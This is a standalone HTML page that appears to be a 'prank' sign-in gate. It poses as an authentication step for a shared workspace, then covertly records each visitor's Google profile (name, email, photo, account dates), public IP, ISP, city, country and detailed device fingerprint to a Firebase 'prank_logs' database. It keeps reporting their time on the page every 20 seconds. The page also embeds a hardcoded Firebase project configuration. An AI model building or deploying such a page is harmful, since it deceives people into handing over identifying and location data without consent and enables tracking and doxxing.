<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Access Directory</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, #121212, #1a1a2e);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            z-index: 10;
            padding: 20px;
            max-width: 450px;
            width: 90%;
        }
        
        /* Interactive Auth View Card */
        .auth-card {
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
        }
        .auth-card h2 {
            margin-bottom: 10px;
            font-size: 1.8rem;
            font-weight: 600;
        }
        .auth-card p {
            font-size: 0.95rem;
            color: #aaa;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        /* Customized Google Button Style */
        .google-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background-color: #ffffff;
            color: #1f1f1f;
            font-size: 0.95rem;
            font-weight: 500;
            font-family: 'Roboto', 'Segoe UI', sans-serif;
            padding: 0 16px;
            height: 44px;
            border: 1px solid #747775;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color .218s, border-color .218s, box-shadow .218s;
            width: 100%;
            max-width: 280px;
        }
        .google-btn:hover {
            background-color: #f8fafd;
            border-color: #c7c7c7;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .google-btn:active {
            background-color: #eeeeee;
        }
        .google-icon {
            width: 18px;
            height: 18px;
            margin-right: 12px;
        }

        /* Prank View State Container (Hidden initially) */
        #prank-screen {
            display: none;
        }
        h1 {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff007f, #ffaa00, #00f0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 1.5s infinite alternate;
            margin-bottom: 20px;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.04); }
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
</head>
<body>

    <canvas id="confetti-canvas"></canvas>

    <!-- State 1: Native Sign-In Interface -->
    <div class="container" id="auth-screen">
        <div class="auth-card">
            <h2>Authentication Required</h2>
            <p>Verify your account status to view this shared configuration workspace.</p>
            
            <button class="google-btn" id="login-trigger">
                <!-- Standard SVG Google logo vector mark -->
                <svg class="google-icon" viewBox="0 0 24 24">
                    <path fill="#EA4335" d="M5.266 9.765A7.077 7.077 0 0 1 12 4.909c1.69 0 3.218.6 4.418 1.582L19.91 3C17.782 1.145 15.055 0 12 0 7.273 0 3.19 2.691 1.145 6.655l4.121 3.11z"/>
                    <path fill="#4285F4" d="M23.491 12.273c0-.818-.073-1.609-.209-2.382H12v4.509h6.445a5.51 5.51 0 0 1-2.391 3.618v3.009h3.864c2.264-2.09 3.573-5.173 3.573-8.755z"/>
                    <path fill="#FBBC05" d="M5.266 14.235A7.09 7.09 0 0 1 4.909 12c0-.791.136-1.555.357-2.265L1.145 6.655A11.93 11.93 0 0 0 0 12c0 1.927.455 3.755 1.255 5.391l4.011-3.156z"/>
                    <path fill="#34A853" d="M12 24c3.245 0 5.973-1.073 7.964-2.918l-3.864-3.01c-1.073.719-2.445 1.155-4.1 1.155-3.155 0-5.818-2.127-6.773-5l-4.01 3.154C3.19 21.309 7.273 24 12 24z"/>
                </svg>
                Sign in with Google
            </button>
        </div>
    </div>

    <!-- State 2: Visual Surprise Reveal View -->
    <div class="container" id="prank-screen">
        <h1>GET PRANKED! 🎉</h1>
        <p style="font-size: 1.4rem; color: #d0d0d0;">Gotcha! Hope this brightened your day.</p>
    </div>

    <!-- Firebase System Module Integration -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
            authDomain: "nexus-web-development-official.firebaseapp.com",
            databaseURL: "https://nexus-web-development-official-default-rtdb.firebaseio.com",
            projectId: "nexus-web-development-official",
            storageBucket: "nexus-web-development-official.firebasestorage.app",
            messagingSenderId: "553556577139",
            appId: "1:553556577139:web:128af196a1eb3dd5999306",
            measurementId: "G-1JW4TQFEG2"
        };

        // Initialize services
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const auth = getAuth(app);
        const provider = new GoogleAuthProvider();

        let sessionRecordRef = null;
        let elapsedTrackingSeconds = 0;

        // Extract deep browser configuration indicators
        function gatherTelemetrySpecs() {
            let gpuVendor = "Unknown", gpuRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            return {
                hardware: {
                    threads: navigator.hardwareConcurrency || "Unknown",
                    ram_gb: navigator.deviceMemory || "Unknown",
                    gpu_chip: gpuRenderer
                },
                environment: {
                    resolution: `${window.screen.width}x${window.screen.height}`,
                    os_platform: navigator.platform,
                    locale_lang: navigator.language,
                    timezone_zone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }
            };
        }

        // Main logging function executing after identity validation completes
        async function logAuthenticatedUser(googleUser, clientIp, geoInfo) {
            const clientSpecs = gatherTelemetrySpecs();

            // Construct cleanly mapped data scheme bundling Google profile details with device information
            const analyticalPayload = {
                authorized_profile: {
                    uid: googleUser.uid,
                    full_name: googleUser.displayName || "Not Shared",
                    email_address: googleUser.email,
                    is_email_verified: googleUser.emailVerified,
                    profile_photo: googleUser.photoURL || "None",
                    account_creation_time: googleUser.metadata.creationTime || "Unknown",
                    last_sign_in_time: googleUser.metadata.lastSignInTime || "Unknown"
                },
                network_location: {
                    ip: clientIp,
                    isp: geoInfo.org || "Unknown",
                    city: geoInfo.city || "Unknown",
                    country: geoInfo.country_name || "Unknown",
                    connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                },
                device_hardware: clientSpecs.hardware,
                device_environment: clientSpecs.environment,
                runtime_updates: {
                    active_duration_seconds: 0,
                    last_seen_timestamp: serverTimestamp()
                }
            };

            const databaseRootRef = ref(database, 'prank_logs');
            sessionRecordRef = push(databaseRootRef);
            
            // Initial write execution
            await update(sessionRecordRef, analyticalPayload)
                .catch((err) => console.error("Database initialization fault:", err));

            // Flip layout container visibility states
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('prank-screen').style.display = 'block';
            document.title = "GET PRANKED! 🎉";
            
            // Ignite background confetti engine loop
            startConfettiEngine();

            // Begin the 20-second background synchronization sequence
            setInterval(() => {
                elapsedTrackingSeconds += 20;
                syncRuntimeTelemetry();
            }, 20000);
        }

        // Async loop modification function mapping persistent state
        async function syncRuntimeTelemetry() {
            if (!sessionRecordRef) return;
            
            const liveDiff = {
                "runtime_updates/active_duration_seconds": elapsedTrackingSeconds,
                "runtime_updates/last_seen_timestamp": serverTimestamp()
            };

            update(sessionRecordRef, liveDiff)
                .catch((e) => console.error("Sync drop:", e));
        }

        // Attach authentication engine execution trigger to UI element
        document.getElementById('login-trigger').addEventListener('click', async () => {
            let publicIp = "Unknown", locationMetadata = {};
            
            // Pre-fetch network attributes before running visual prompt processes
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (ipResponse.ok) {
                    locationMetadata = await ipResponse.json();
                    publicIp = locationMetadata.ip || "Unknown";
                }
            } catch (e) {}

            // Open secure system OAuth popup element
            signInWithPopup(auth, provider)
                .then((result) => {
                    // Extract credential token metadata variables directly out of success response mappings
                    const userProfile = result.user;
                    logAuthenticatedUser(userProfile, publicIp, locationMetadata);
                })
                .catch((error) => {
                    console.error("Authentication popup window dismissed or aborted:", error.message);
                });
        });
    </script>

    <!-- Continuous Confetti Engine Layout Loop -->
    <script>
        function startConfettiEngine() {
            const canvasElement = document.getElementById('confetti-canvas');
            const parameters = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
            function scopeRandom(min, max) { return Math.random() * (max - min) + min; }

            setInterval(function() {
                confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.1, 0.3), y: Math.random() - 0.2 } });
                confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.7, 0.9), y: Math.random() - 0.2 } });
            }, 250);
        }
    </script>
</body>
</html>
